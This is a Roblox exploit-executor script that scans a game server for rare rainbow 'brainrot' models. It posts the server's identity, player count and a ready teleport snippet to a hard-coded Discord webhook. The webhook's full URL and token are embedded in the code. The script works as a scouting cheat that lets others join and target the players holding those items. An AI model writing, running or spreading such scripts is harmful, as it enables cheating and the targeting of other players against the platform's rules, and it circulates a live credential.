local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local allowedPlaceId = 109983668079237
if game.PlaceId ~= allowedPlaceId then return end

local webhookUrls = {
    "https://discord.com/api/webhooks/1397331310510473278/S8xtbF9bLi_C-QfbmlILqBWTc5hx4SrSeCrk1HaZqcwJ08zZliRfNMyWrVaxN3Z9WUDW"
}

local lastSentMessage = ""
local notified = {}

local function getPlayerCount()
    return #Players:GetPlayers()
end

local function sendNotification(modelName, mutation, moneyText)
    if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then return end
    if not game.JobId or game.JobId == "" or game.JobId:lower():find("priv") then return end

    local placeId = tostring(game.PlaceId)
    local jobId = game.JobId
    local gameName = "Unknown"
    local playerCount = getPlayerCount()

    -- üõ°Ô∏è Strict Validation
    if not placeId or placeId == "" then return end
    if not jobId or jobId == "" then return end
    if not modelName or modelName == "" then return end
    if not mutation or mutation == "" then return end
    if not playerCount or playerCount < 4 or playerCount > 7 then return end

    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info and info.Name or "Unknown"
    end)

    local msg = string.format([[
---- <@&1392894797831733329> ----

--- üì¢ **Game:** %s

--- üí° **Model Name:** "%s"

--- üé® **Mutation:** %s

--- üíµ **Money/s:** %s

--- üë• **Player Count:** %d/8

local player = game.Players:GetPlayers()[1]
local teleportService = game:GetService("TeleportService")
teleportService:TeleportToPlaceInstance("%s", "%s", player)
]], gameName, modelName, mutation, moneyText or "N/A", playerCount, placeId, jobId)

    -- Block dangerous mentions
    if msg:find("@everyone") or msg:find("@here") then return end

    -- Format match check (strict header line)
    if not msg:find("^---- <@&1392894797831733329> ----\n\n--- üì¢ %*%*Game:%*%*") then return end

    -- Prevent sending duplicate message
    if msg == lastSentMessage then return end
    lastSentMessage = msg

    -- Send webhook
    local payload = {content = msg}
    local jsonData = HttpService:JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if not req then return end

    for _, url in ipairs(webhookUrls) do
        pcall(function()
            req({
                Url = url,
                Method = "POST",
                Headers = headers,
                Body = jsonData
            })
        end)
    end
end

local function checkBrainrots()
    local players = Players:GetPlayers()
    if #players < 4 or #players > 7 then return end

    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChild("Head") and v:FindFirstChild("HumanoidRootPart") then
            local hrp = v:FindFirstChild("HumanoidRootPart")
            local head = v:FindFirstChild("Head")
            if hrp and head:FindFirstChild("OriginalSize") and not notified[v.Name] then
                local originalSize = head.OriginalSize
                if originalSize and typeof(originalSize) == "Vector3" then
                    local mutation = tostring(originalSize)
                    local rounded = mutation:match("%((.-)%)")
                    local color = hrp.BrickColor
                    local moneyText = (v:FindFirstChild("Earnings") and v.Earnings:FindFirstChild("TextLabel") and v.Earnings.TextLabel.Text) or "N/A"

                    local rainbowColors = {
                        BrickColor.new("Really red"),
                        BrickColor.new("Deep orange"),
                        BrickColor.new("New Yeller"),
                        BrickColor.new("Lime green"),
                        BrickColor.new("Really blue"),
                        BrickColor.new("Royal purple"),
                        BrickColor.new("Hot pink")
                    }

                    local isRainbow = false
                    for _, c in ipairs(rainbowColors) do
                        if color == c then
                            isRainbow = true
                            break
                        end
                    end

                    if isRainbow then
                        notified[v.Name] = true
                        sendNotification(v.Name, rounded or mutation, moneyText)
                    end
                end
            end
        end
    end
end

while task.wait(5) do
    pcall(checkBrainrots)
end
